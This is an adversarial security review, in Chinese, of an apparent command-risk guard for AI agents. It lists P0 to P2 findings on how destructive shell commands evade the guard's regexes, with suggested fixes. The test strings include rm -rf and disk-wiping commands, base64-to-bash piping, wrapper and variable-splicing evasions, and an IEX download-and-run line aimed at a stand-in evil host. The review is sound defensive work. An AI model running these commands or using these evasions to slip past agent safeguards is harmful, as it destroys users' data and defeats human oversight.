# RiskGuard 对抗审查报告（GAN 式判别器）

> 审查员：独立对抗审查员（不负责表扬，只负责挑刺）
> 审查日期：2026-08-21
> 审查范围：packages/core（normalize / policy-engine / decision / event / path-resolver）、
>           packages/adapters/dsh、packages/dsh/plugin.ts、packages/installer/deploy.ts
> 审查方法：静态代码审查 + 动态绕过测试（88 条命令分类探测 + 全链路 Decision 探测）

---

## P0 级：可绕过拦截（严重安全缺陷）

### P0-1：`/bin/rm -rf /tmp` 完整路径绕过 classifyShellCommand

**问题描述**：`classifyShellCommand` 的 rm 检测依赖两个正则的交集：
1. `\brm\s+(-[a-z]*r)?-?[a-z]*f?`（词边界 + 标志）
2. `/(^|[;&|])\s*rm\s+/`（上下文：命令开头或分隔符后）

对于 `/bin/rm -rf /tmp`，正则 1 能匹配（`\brm` 在 `/bin/rm` 中匹配，因为 `/` 是非词字符），但正则 2 失败——`rm` 前面是 `/bin/`，不在 `(^|[;&|])` 集合中。两者取交集 → null → 不被分类为破坏性。

Guard 正则（plugin.ts:76）同理：`(^|[;&|])\s*(rm\s+-rf|...)` 也无法匹配 `/bin/rm`。

**复现**：`classifyShellCommand('/bin/rm -rf /tmp')` → null → evaluateDsh → ASK（不是 DENY）

**测试字符串**：
```
/bin/rm -rf /tmp
/usr/bin/rm -rf /tmp
C:\System32\rm.exe -rf
```

**建议修复**：rm 上下文正则应将 `/` 加入分隔符集合：`/(^|[;&|/])\s*rm\s+/`，或者去掉上下文检查，仅依赖 `\brm\s+`（但需注意 `farm` 之类的误匹配，当前词边界已处理）。更稳健的做法：对 rm 家族单独做路径感知检测。

---

### P0-2：`eval "rm -rf"` / `bash -c "rm -rf"` / `sh -c "rm -rf"` 绕过

**问题描述**：classifyShellCommand 不识别 `eval`、`bash -c`、`sh -c` 包裹的危险命令。这三个都是 shell 中最常见的命令注入载体。

**复现**：
```
classifyShellCommand('eval "rm -rf /tmp/x"')         → null
classifyShellCommand('bash -c "rm -rf /tmp"')         → null
classifyShellCommand('sh -c "rm -rf /tmp"')           → null
```

全链路结果：→ process.execute → RG-PROC-001 → **ASK**（不是 DENY）

注意：classify 已经检测了 `powershell -enc`（编码命令），但对 `bash -c` / `sh -c` 这种更常见的载体视而不见。

**建议修复**：增加模式检测：
```ts
/\b(bash|sh|pwsh|powershell)\s+-c\s+.*\b(rm|Remove-Item|del|rmdir)\b/
```
或者更通用地：检测 shell 调用器 `-c` 参数中是否包含已知破坏模式。

---

### P0-3：变量拼接 `a="rm"; $a -rf /tmp` 绕过

**问题描述**：Shell 变量展开在 classify 的正则层面不可求值。`a="rm"; $a -rf /tmp` 中 `$a` 不匹配 `\brm`。

**复现**：`classifyShellCommand('a="rm"; $a -rf /tmp')` → null → ASK

**测试字符串**：
```
a="rm"; $a -rf /tmp
${x} -rf /tmp
$MY_RM -rf /tmp
```

**建议修复**：这是启发式分类器的固有局限，无法在纯正则层面完美解决。建议：
1. 在文档中明确声明 classify 是 fast-path 辅助，不是能力边界
2. Guard 层（plugin.ts）应覆盖更多载体模式
3. 长期方案：引入简单 AST 解析器

---

### P0-4：`echo 'rm -rf' > /tmp/run.sh && bash /tmp/run.sh` 两阶段写+执行

**问题描述**：将危险命令写入临时脚本再执行，是经典的两阶段攻击。classify 只看命令字符串，看不到"写一个恶意脚本然后执行它"的语义。

**复现**：
```
classifyShellCommand("echo 'rm -rf /tmp/x' > /tmp/run.sh && bash /tmp/run.sh") → null
classifyShellCommand("echo rm -rf /tmp | tee /tmp/r.sh && bash /tmp/r.sh") → null
```

全链路：→ process.execute → **ALLOW**（defaults 中 `!destructive` → allow）

**测试字符串**：
```
echo 'rm -rf /tmp/x' > /tmp/run.sh && bash /tmp/run.sh
echo rm -rf /tmp | tee /tmp/r.sh && bash /tmp/r.sh
printf 'rm -rf /tmp' | bash
```

**建议修复**：检测 `echo ... > *.sh && bash *.sh` 模式，或将 `bash *.sh`（无白名单前缀的脚本执行）标记为高风险。

---

### P0-5：base64 编码绕过 `echo cm0gLXJm | base64 -d | bash`

**问题描述**：将 `rm -rf /tmp` base64 编码后通过管道解码执行。classify 只检测了 `powershell -enc`（PowerShell 编码），但对 `base64 -d | bash` 这种 Unix 通用编码绕过完全忽略。

**复现**：
```
classifyShellCommand('echo cm0gLXJmIC90bXA= | base64 -d | bash') → null
```

全链路：→ process.execute → **ALLOW**（`!destructive` → default allow）

**建议修复**：增加模式：`/(base64|xxd|printf)\s.*\|\s*(bash|sh|pwsh|powershell)/`

---

### P0-6：`git push --force` / `git branch -D` / `git restore .` 未被分类

**问题描述**：三个真实的 git 破坏性操作绕过了 classifyShellCommand：

| 命令 | classify 结果 | evaluate 结果 | 期望 |
|------|-------------|-------------|------|
| `git push --force origin main` | null → **isReadOnly=true** | process.execute → **ASK** | DENY |
| `git branch -D feature` | null → **isReadOnly=true** | process.execute → **ASK** | DENY |
| `git restore .` | null → isReadOnly=false | process.execute → **ASK** | DENY |

注意 `git push --force` 和 `git branch -D` 甚至被 `isReadOnlyCommand` 误判为只读！正则 `git\s+(...|push)\b` 只匹配到 `git push` 就成功了，完全不检查 `--force` 或 `-D` 标志。

而 `git checkout -- .`（等效于 `git restore .`）是被 classify 检测到的，但它的替代命令 `git restore .` 不在检测范围内。

**复现**：
```
classifyShellCommand('git push --force origin main') → null
classifyShellCommand('git branch -D feature') → null
classifyShellCommand('git restore .') → null
isReadOnlyCommand('git push --force origin main') → true  ← 严重！
isReadOnlyCommand('git branch -D feature') → true  ← 严重！
```

**建议修复**：
1. classify 增加：`/\bgit\s+push\s+.*--force\b/` 和 `/\bgit\s+branch\s+-D\b/` 和 `/\bgit\s+restore\b/` 到 git 破坏性模式
2. isReadOnly 的 git 正则需要排除危险标志（`--force`、`-f`、`-D`）

---

### P0-7：`python -c 'import subprocess; subprocess.run(["rm"...])'` 动态执行绕过

**问题描述**：classify 检测了 `shutil.rmtree`、`os.remove`、`os.unlink`、`pathlib.*.unlink`，但不检测：
- `subprocess.run(["rm"...])` 
- `__import__('shutil').rmtree(...)`
- `importlib.import_module("shutil").rmtree(...)`
- `child_process.execSync("rm ...")`

**复现**：
```
classifyShellCommand("python -c 'import subprocess; subprocess.run([\"rm\",\"-rf\",\"/tmp/x\"])'") → null
classifyShellCommand("__import__('shutil').rmtree('build')") → null
classifyShellCommand("node -e \"require('child_process').execSync('rm -rf /tmp/x')\"") → null
classifyShellCommand("node -e \"require('fs').promises.rm('x',{recursive:true})\"") → null
```

全链路：→ process.execute → **ALLOW**（`!destructive` → default allow）

**测试字符串**：
```
python -c 'import subprocess; subprocess.run(["rm","-rf","/tmp/x"])'
__import__('shutil').rmtree('build')
import importlib; importlib.import_module("shutil").rmtree("build")
node -e "require('child_process').execSync('rm -rf /tmp/x')"
node -e "require('fs').promises.rm('x',{recursive:true})"
node -e 'import("fs").then(f=>f.rmSync("x",{recursive:true}))'
node -e "process.mainModule.require('child_process').execSync('rm -rf /tmp/x')"
```

**建议修复**：
1. classify 增加 `subprocess` 检测模式
2. Node 侧增加 `child_process`、`execSync`、`exec` 模式检测
3. 增加 `__import__`、`importlib` 动态导入检测

---

### P0-8：磁盘销毁命令遗漏 `mkfs` / `dd` / `wipefs`

**问题描述**：classify 只检测了 `format-volume|format-partition|format-drive|diskpart|clear-disk|mkdirfs|dd of=`，但遗漏了：
- `mkfs.ext4 /dev/sda1`（Linux 格式化）
- `dd if=/dev/zero of=/dev/sda`（零填充磁盘）
- `wipefs -a /dev/sda`（擦除文件系统签名）

**复现**：
```
classifyShellCommand('mkfs.ext4 /dev/sda1') → null → ASK
classifyShellCommand('dd if=/dev/zero of=/dev/sda') → null → ASK
classifyShellCommand('wipefs -a /dev/sda') → null → ASK
```

注意：classify 中有 `dd of=` 检测，但 `dd` 需要与 `of=` 紧邻才能匹配，而 `dd if=/dev/zero of=/dev/sda` 中间有 `if=` 参数，`\bdd\s+of=` 的匹配取决于正则引擎是否允许中间内容——实际上 `\bdd\s+of=` 是字面匹配，不会跳过 `if=/dev/zero `。所以 `dd if=/dev/zero of=/dev/sda` 确实绕过了。

**建议修复**：增加 `mkfs\b`、`/\bdd\b/`（不限标志顺序）、`/\bwipefs\b/`

---

### P0-9：`xargs -0 rm` 绕过 xargs 检测

**问题描述**：classify 的 xargs 检测正则是 `/\bxargs\s+rm\b/`，要求 `xargs` 后直接跟 `rm`。但 `xargs -0 rm` 在中间插入了 `-0` 标志，绕过了检测。

**复现**：
```
classifyShellCommand('find . -print0 | xargs -0 rm') → null → ASK
```

**测试字符串**：
```
find . -print0 | xargs -0 rm
find . -print0 | xargs -0 rm -f
```

**建议修复**：改为 `/\bxargs\b.*\brm\b/` 或 `/\bxargs\b[^|;&\n]*\brm\b/`

---

### P0-10：`IEX (New-Object Net.WebClient).DownloadString('https://evil.ps1')` 下载执行

**问题描述**：classify 检测了 `powershell -enc`（编码命令），但不检测 IEX + WebClient 下载模式——这是 PowerShell 远程代码执行的最常见模式。

**复现**：
```
classifyShellCommand("IEX (New-Object Net.WebClient).DownloadString('https://evil.ps1')") → null → ASK
```

**建议修复**：增加 `/(iex|invoke-expression).*(webclient|downloadstring|downloadfile)/i`

---

### P0-11：`tar xzf evil.tar.gz --overwrite` / `unzip -o evil.zip` 覆盖解压

**问题描述**：通过解压覆盖任意文件是经典的路径穿越攻击（Zip Slip）。classify 和 guard 都没有检测。

**复现**：
```
classifyShellCommand('tar xzf evil.tar.gz --overwrite') → null → ASK
classifyShellCommand('unzip -o evil.zip -d /tmp') → null → ASK
```

**建议修复**：对 `tar`/`unzip` 带 `--overwrite`/`-o` 标志且目标为敏感路径的情况标记为高风险。

---

## P1 级：误伤或契约 Bug

### P1-1：`rm --help` 和 `rm`（无参数）被误判为删除

**问题描述**：`rm --help` 打印帮助信息，`rm`（无参数）打印用法提示——两者都是无害的。但 classify 的 rm 正则 `\brm\s+(-[a-z]*r)?-?[a-z]*f?` 会匹配它们（标志组全部为空也匹配成功）。

**复现**：
```
classifyShellCommand('rm --help') → {domain:'filesystem', action:'delete'}
classifyShellCommand('rm') → {domain:'filesystem', action:'delete'}
```

这在 pre-execute 链路中会导致 `rm --help` 被 ASK 确认。

**影响**：低。Agent 执行 `rm --help` 被要求确认是烦人的误伤，但不丢数据。

**建议修复**：rm 正则增加负前瞻排除 `--help`/`--version`/`-h`/`-V`。

---

### P1-2：`git push` 白名单不区分 force 与 normal

**问题描述**：isReadOnlyCommand 的 git 白名单包含 `push`，但不检查 `--force`/`-f` 标志。结果：
```
isReadOnlyCommand('git push --force') → true  ← 严重误判！
isReadOnlyCommand('git push -f')       → true  ← 严重误判！
```

`git push --force` 是能覆盖远程历史的破坏性操作，但被标记为只读。

**影响**：在 parseDshPayload 中，`git push --force` 走 isReadOnly 分支 → domain=filesystem, action=read → evaluate → **ALLOW**。破坏性 force push 被完全放行。

**建议修复**：git 白名单需要对 `push` 添加标志排除：`git\s+push\s+(?!.*(--force|-f))`，或直接从白名单移除 `push`（push 不是只读操作）。

---

### P1-3：`git branch -D` 被白名单误判为只读

**问题描述**：同 P1-2。`git branch` 在白名单中，但 `-D`（强制删除分支）是破坏性的。

```
isReadOnlyCommand('git branch -D feature') → true
```

**影响**：同 P1-2，force-delete 分支被放行。

**建议修复**：`git branch` 白名单应仅允许 `git branch -a`（列出）和 `git branch`（列出当前），或排除 `-D`/`-d` 标志。

---

### P1-4：`cp` / `mv` 不在 isReadOnly 白名单中

**问题描述**：`isReadOnlyCommand` 的白名单包含 `mkdir`、`touch`、`find`，但不包含 `cp` 和 `mv`。这导致：
```
isReadOnlyCommand('cp a.txt b.txt') → false
isReadOnlyCommand('mv a.txt b.txt') → false
```

在 parseDshPayload 中，`cp`/`mv` 会走到最后一分支 → domain=process, action=execute → evaluate → ASK（不是 deny，但需要确认）。

**影响**：Agent 频繁使用 `cp`/`mv` 每次都被要求确认，体验差。但 `mv` 确实不是只读的，且在默认策略下不会被 deny。

**建议修复**：在 isReadOnly 白名单中增加 `cp\b|mv\b`（前提是 classify 不将其标记为破坏性，当前确实不会）。

---

### P1-5：`npx <任意工具>` 不在 isReadOnly 白名单

**问题描述**：白名单第三条正则只允许 `npx\s+(test|run|build|lint|format|check|install|add|ci|exec|pub)\b`，不包含 `npx vitest`、`npx eslint` 等常见开发工具。

```
isReadOnlyCommand('npx vitest run') → false
isReadOnlyCommand('npx vitest') → false
```

**影响**：Agent 使用 `npx vitest` 会走到 process.execute 路径 → ASK。误伤。

**建议修复**：白名单扩展为 `npx\s+\S+`（npx 后跟任意单词作为工具名），或维护一个常用工具列表。

---

### P1-6：Policy.defaults 是死代码

**问题描述**：`Policy` 类型声明了 `defaults` 对象（含 `read`、`reversibleWorkspaceWrite`、`irreversible`、`unknownMutation`），但 `evaluate()` 函数完全不读取 `policy.defaults`。它直接检查 `event.operation.destructive`。

具体影响：
- `defaults.unknownMutation = 'deny'` 从未生效——任何非 destructive 操作（如 `filesystem.move`）都走 `!destructive → allow`
- `defaults.reversibleWorkspaceWrite = 'allow'` 从未生效——靠 `!destructive` 间接达到相同效果
- `defaults.irreversible = 'deny'` 从未生效——靠 `destructive → deny` 间接达到相同效果

**复现**：
```ts
const ev = createEvent({..., operation: {domain:'filesystem', action:'move', destructive:false, ...}});
evaluate(ev, defaultPolicy()); // → allow，尽管 defaults.unknownMutation = 'deny'
```

**建议修复**：在 evaluate() 的 defaults 分支中读取 policy.defaults，或从类型定义中移除 defaults 字段以消除误导。

---

### P1-7：`dd` 的正则 `\bdd\s+of=` 不匹配 `dd if=... of=...`

**问题描述**：classify 中磁盘检测使用 `\bdd\s+of=`，要求 `dd` 后直接跟 `of=`。但实际 `dd` 命令通常写成 `dd if=/dev/zero of=/dev/sda`，`of=` 前面有 `if=...` 参数。

**复现**：
```
classifyShellCommand('dd if=/dev/zero of=/dev/sda') → null
```

**建议修复**：改为 `/\bdd\b.*\bof=/` 或 `/\bdd\b/`（无条件标记为高风险）。

---

## P2 级：测试盲区 / 建议

### P2-1：adversarial-corpus 遗漏的攻击向量

以下绕过向量在 `tests/adversarial/adversarial-corpus.test.ts` 中未覆盖：

| 类别 | 未覆盖的测试字符串 |
|------|-------------------|
| 完整路径 | `/bin/rm -rf /tmp`、`/usr/bin/rm -rf /tmp` |
| eval 包裹 | `eval "rm -rf /tmp"`、`bash -c "rm -rf /tmp"`、`sh -c "rm -rf /tmp"` |
| 变量拼接 | `a="rm"; $a -rf /tmp` |
| 编码管道 | `echo cm0gLXJm \| base64 -d \| bash`、`printf 'rm -rf' \| bash` |
| 两阶段写入 | `echo 'rm -rf' > /tmp/run.sh && bash /tmp/run.sh` |
| Python 动态 | `__import__('shutil').rmtree('build')`、`python -c 'import subprocess; subprocess.run(["rm"...])'` |
| Node 动态 | `node -e "require('child_process').execSync('rm -rf /tmp/x')"` |
| git 遗漏 | `git push --force`、`git branch -D`、`git restore .` |
| 磁盘 | `mkfs.ext4 /dev/sda1`、`dd if=/dev/zero of=/dev/sda`、`wipefs -a /dev/sda` |
| xargs 变体 | `find . -print0 \| xargs -0 rm` |
| PowerShell 下载 | `IEX (New-Object Net.WebClient).DownloadString(...)` |
| 归档覆盖 | `tar xzf evil.tar.gz --overwrite`、`unzip -o evil.zip` |
| 多行 | `echo start\nrm -rf /tmp` |

### P2-2：中间换行绕过 classify 的上下文正则

**问题描述**：`classifyShellCommand` 先 `toLowerCase().trim()`，但 `trim()` 只去除首尾空白，不去除中间的换行。正则 `/(^|[;&|])\s*rm\s+/` 的上下文检查要求 `rm` 在字符串开头或 `;&|` 之后。当 `rm` 出现在多行字符串的中间行时，正则匹配失败。

**复现**：
```
classifyShellCommand("echo start\n\nrm -rf /tmp\n\necho end") → null
```

`trim()` 后字符串为 `"echo start\n\nrm -rf /tmp\n\necho end"`，`rm` 不在 `^` 位置，前面也没有 `;&|`。

**测试字符串**：
```
echo start
rm -rf /tmp

echo end
```

**建议修复**：将换行符 `\n`/`\r` 加入上下文分隔符集合：`/(^|[;&|\n\r])\s*rm\s+/`

---

### P2-3：Guard 正则（plugin.ts）与 classify 正则的覆盖差距

Guard 正则比 classify 窄得多：

| 特性 | classifyShellCommand | Guard (plugin.ts) |
|------|---------------------|-------------------|
| rm -rf | ✓ | ✓ |
| /bin/rm -rf | ✗ | ✗ |
| Remove-Item | ✓ | ✓ |
| del /f | ✓ | ✓（仅 /f /q /s） |
| rmdir /s | ✓ | ✓ |
| shutil.rmtree | ✓ | ✓ |
| fs.rmSync | ✓ | ✓ |
| rimraf | ✓ | ✓ |
| encoding (powershell -enc) | ✓ | ✗ |
| curl\|bash 远程管道 | ✓ | ✗ |
| IEX 变量拼接 | ✓ | ✗ |
| Python subprocess | ✗ | ✗ |
| Node child_process | ✗ | ✗ |
| git clean/reset | ✓ | ✗ |
| xargs rm | ✓ | ✗ |

Guard 层是单调最终防线，但它的模式覆盖比 classify 还窄。这意味着 classify 拒绝的命令，guard 也可能拒绝（双保险），但 classify 漏掉的命令，guard 也大概率漏掉。

---

### P2-4：`evaluateAll` 不保证策略间单调性

**问题描述**：`evaluateAll` 对多个 event × 多个 policy 依次调用 `combineDecisions`。`combineDecisions` 正确处理了单调性（单调 deny 优先）。但如果 Policy A 的规则给 event X 产生了 non-monotonic deny，而 Policy B 的规则给同一个 event X 产生了 allow，则结果取决于顺序：A 先 → deny，B 先 → deny（因为 B 的 allow 遇到 A 的 deny → deny）。实际测试确认两个方向都产生 deny，所以这里没问题。但如果未来引入 monotonic allow（目前不存在），则可能出问题。

**建议**：文档中明确声明 combineDecisions 的语义：deny 永远优先于 allow，单调性只影响"不可被后续覆盖"这一属性。

---

### P2-5：`git stash` / `git stash pop` 的分类归属

**问题描述**：`git stash` 修改工作区（保存到栈），`git stash pop` 恢复并删除栈项。两者都改变了文件状态，但 classify 不识别它们，isReadOnly 也不识别（因为不在白名单中）。

结果：走 process.execute → ASK。这个处理是合理的（stash pop 可能有冲突），但 `git stash`（仅保存当前状态）被 ASK 确认是过度谨慎。

**建议**：将 `git stash`（不带 pop/drop）加入 isReadOnly 白名单；将 `git stash drop` 加入 classify 破坏性模式。

---

### P2-6：`Git checkout -- file` 检测但 `git restore file` 不检测

**问题描述**：classify 检测了 `git checkout --`（丢弃工作区变更），但 `git restore` 是 Git 2.23+ 推荐的等效命令，未被检测。

**复现**：
```
classifyShellCommand('git checkout -- .') → {domain:'git', action:'git_checkout_discard'}  ✓
classifyShellCommand('git restore .')      → null  ✗
classifyShellCommand('git restore --staged .') → null  ✗
```

**建议修复**：增加 `/\bgit\s+restore\b/` 到 git 破坏性模式。

---

### P2-7：`isReadOnly` 的 `git push` 白名单包含 `--force`

如 P1-2/P1-3 所述，这是误判。在测试盲区中，对抗语料库没有测试 `git push --force` 和 `git branch -D` 的 isReadOnly 行为。

---

### P2-8：`Credential export` 检测遗漏多个常见 token 名

**问题描述**：classify 的凭据导出正则只检测特定前缀（aws_secret, azure_.*key, openai_api_key, anthropic_api_key, gh_token, gitlab_token, slack_token, api[-_]?key），但不包含：
- `GITHUB_TOKEN`
- `NPM_TOKEN`
- `DATABASE_URL`（含密码）
- `STRIPE_SECRET_KEY`
- `TWILIO_AUTH_TOKEN`
- 任何 `*_TOKEN` / `*_SECRET` 环境变量

**建议修复**：扩大模式为 `/(echo|print|type|write-output)\s+(\$env:)?(\w*(token|secret|password|key|credential)\w*)/i`

---

### P2-9：`strictPolicy` 的 `RG-GUARD-002` 缺少 `domain` 约束

**问题描述**：`RG-GUARD-002` 的 match 只指定了 `targetTags` 和 `action`，没有指定 `domain`。这意味着它会匹配所有 domain 中的 delete/overwrite/truncate/move 操作。如果某个非 filesystem domain 的 event 意外携带了 `riskguard` tag，也会被拒绝。

这在当前系统中不太可能发生（tag 由 Adapter 层添加），但契约上不够严谨。

---

## 总体评分：4 / 10

**理由**：

1. **设计架构合理**（+3）：三层防御（classify fast-path → policy engine → guard 单调防线）的思路正确；fail-closed 语义实现正确；monotonic 不变量在代码和测试中都有验证；Decision/Event 类型契约清晰。

2. **核心 regex 存在系统性绕过**（-4）：classifyShellCommand 作为第一道防线，无法处理完整路径（`/bin/rm`）、eval/bash -c 包裹、变量拼接、编码绕过、两阶段攻击、动态语言导入等至少 7 类常见绕过向量。这些都是攻击者第一反应会尝试的手段。

3. **Guard 层覆盖不够**（-1）：plugin.ts 的单调 guard 只覆盖了最基础的 rm/Remove-Item/del 模式，比 classify 的覆盖面还窄。作为"最终防线"，guard 应该是覆盖面最广的。

4. **isReadOnly 白名单有严重误判**（-1）：`git push --force` 和 `git branch -D` 被误判为只读，直接跳过 classify 和完整评估链路，进入 read-only fast-path → allow。这是设计级别的缺陷。

5. **Policy.defaults 是死代码**（-1）：类型声明的 `unknownMutation: 'deny'` 从未被 evaluate 执行，给审查者和维护者造成虚假安全感。

6. **测试覆盖率不足**（-1）：30 条对抗语料只覆盖了最基础的 rm/PowerShell/Python/Node 变体，缺少对上述 P0 绕过向量的任何测试。

**总结**：RiskGuard 对"直接输入 `rm -rf /tmp`"这种最原始的攻击有良好防护，但对于稍微聪明一点的攻击者（完整路径、eval 包裹、编码、变量拼接、两阶段攻击、动态导入）几乎全线失守。更严重的是，`git push --force` 这种常见操作被误判为只读而直接放行。当前拦截更像是一层"诚实开发者自我约束"的护栏，而不是真正的安全边界。

---

*报告结束。所有测试均未实际执行任何删除命令。*
